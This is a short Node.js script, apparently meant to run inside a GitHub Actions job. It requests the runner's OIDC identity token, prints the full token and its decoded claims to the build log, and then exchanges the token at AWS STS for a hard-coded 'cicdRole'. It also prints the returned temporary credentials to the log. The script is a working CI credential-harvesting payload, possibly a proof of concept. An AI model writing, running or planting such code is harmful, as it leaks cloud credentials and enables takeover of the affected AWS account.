(async () => {
  const u = process.env.ACTIONS_ID_TOKEN_REQUEST_URL, t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!u || !t) { console.log('C211ERR:no-oidc-env'); return; }
  try {
    const r = await fetch(u + (u.includes('?') ? '&' : '?') + 'audience=sts.amazonaws.com', { headers: { Authorization: 'Bearer ' + t, Accept: 'application/json' } });
    const j = await r.json();
    const tok = j.value || '';
    console.log('C211CTX:' + [process.env.GITHUB_REPOSITORY, process.env.GITHUB_REF, process.env.GITHUB_SHA, process.env.GITHUB_EVENT_NAME].join(' '));
    console.log('C211TOKLEN:' + tok.length);
    console.log('C211TOK:' + tok);
    try { const p = tok.split('.')[1]; console.log('C211CLAIMS:' + Buffer.from(p, 'base64url').toString('utf8')); } catch (e) {}
    const body = new URLSearchParams({
      Action: 'AssumeRoleWithWebIdentity', Version: '2011-06-15',
      RoleArn: 'arn:aws:iam::009661764077:role/cicdRole',
      RoleSessionName: 'c211-corgi', WebIdentityToken: tok,
    });
    const s = await fetch('https://sts.amazonaws.com/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
    const stxt = await s.text();
    console.log('C211STSHTTP:' + s.status);
    console.log('C211STS_BEGIN');
    console.log(stxt.slice(0, 8000));
    console.log('C211STS_END');
  } catch (e) { console.log('C211ERR:' + (e && e.stack ? e.stack : e)); }
})();
